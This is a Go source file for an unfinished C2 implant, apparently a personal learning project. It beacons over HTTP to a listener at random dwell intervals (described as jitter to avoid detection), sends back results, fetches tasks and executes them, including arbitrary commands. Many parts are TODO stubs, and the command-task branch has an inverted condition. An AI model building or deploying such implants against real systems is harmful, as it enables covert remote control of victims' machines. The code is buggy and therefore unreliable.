package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand/v2"
	"net/http"
	"time"
)

const (
	scheme     = "http"
	beaconPath = "beacon"
)

type ImplantProfile struct {
	// TODO
}

type Implant struct {
	ImplantProfile
	// need URI?
	host, port string
	running    bool
	// make this uint?
	dwellTime int // TODO: rename? rn just using random int between 1 and 30 min, change to use exponential like article?
	// jitter: randomized number to avoid detection
	results        []Result
	requestedTasks []TaskRequest
	tasks          []Tasker // TODO: have queue?, called this current TaskRequest Queue?
	killSignal     bool
}

// BeaconLoop will perform a beacon loop to continuously communicate w/ the listener
func (i *Implant) BeaconLoop() {
	//TODO: def a better way to do this
	if !i.killSignal {
		time.Sleep(time.Minute * time.Duration(i.dwellTime))
		i.running = true // make sure running status changes accurately, also figure out why I need this
		_ = i.Beacon()   // TODO: handle error
		newDwellTime := rand.IntN(30)
		i.dwellTime = newDwellTime
		i.BeaconLoop()
	} else {
		i.selfDestruct()
	}
}

// need this func?
func (i *Implant) Beacon() error {
	// TODO: find a way to ensure return value of sendResults always get used?
	//TODO: Doesn't make sense to send a 200 if some results failed
	// TODO: error in this func for?
	i.PostBeacon()
	if len(i.results) > 0 {
		_ = i.ExecuteTasks()
	}

	return nil
}

func (i *Implant) PostBeacon() {
	listenerURI := fmt.Sprintf("%s://%s:%s/%s", scheme, i.host, i.port, beaconPath)

	body, err := json.Marshal(i.results)
	if err != nil {
		panic(err) // handle error differently
	}

	// TODO: learn about buffers
	r, err := http.NewRequest("POST", listenerURI, bytes.NewBuffer(body))
	if err != nil {
		panic(err)
	}

	r.Header.Add("Content-Type", "application/json")

	client := &http.Client{}
	res, err := client.Do(r) // Do sends HTTP request, receives HTTP response, error if non-200 status code thrown
	if err != nil {
		panic(err)
	}

	// response Body streamed on demand
	defer res.Body.Close()

	newTasks := make([]TaskRequest, 0)
	err = json.NewDecoder(res.Body).Decode(&newTasks)
	if err != nil {
		panic(err)
	} // better error handling (ex. try again, kill switch if cannot make connection or smthing)

	if res.StatusCode != http.StatusCreated { // 201 Created status code: HTTP request was successful, server created new resource as a result (used after POST to signify server has successfully processed request + created new resource)
		panic(res.Status)
	}

	i.requestedTasks = newTasks
	i.results = make([]Result, 0) // reset results assuming they were successfully sent
}

func (i *Implant) ExecuteTasks() error {
	for _, requestedTask := range i.requestedTasks {
		var newTask Tasker
		switch requestedTask.TaskType {
		case "Configure":
			// TODO: fix?
			var dwell int
			var running, ok bool // why need ok here?
			// TODO: why is it taking in dwell if configuring
			if dwell, ok = requestedTask.Options["dwell"].(int); ok {
				if running, ok = requestedTask.Options["running"].(bool); ok {
					newTask = NewConfigureTask(dwell, running, i) // parse options in NewConfigureTask, have it throw error instead?
				} // handle the !ok
			}
		case "Ping":
			newTask = NewPingTask()
		case "Command":
			var commandWithArgs []string
			var ok bool
			if commandWithArgs, ok = requestedTask.Options["commandWithArgs"].([]string); !ok {
				newTask = NewCommandTask(commandWithArgs)
			} else {
				return fmt.Errorf("error") //TODO: should be retuning API errors instead
			}
		default:
			return fmt.Errorf("Unsupported task type %s", requestedTask.TaskType)
		}

		result, _ := newTask.Execute() // T: handle
		result.TaskID = requestedTask.ID

		// TODO: have to make this async, test with block operations rn should just block the main thread
		i.results = append(i.results, *result)
	}
	return nil
}

func (i *Implant) FirstBeacon(results []Result) {
	// make this a "check in" endpoint?
	// send system info
	// receive initial config values
	// store implant profiles in SQL
}

func (i *Implant) selfDestruct() {
	// TODO
}

func NewImplant(host string, port string, initialDwellTime int) *Implant {
	return &Implant{
		host:      host,
		port:      port,
		dwellTime: initialDwellTime,
	}
}
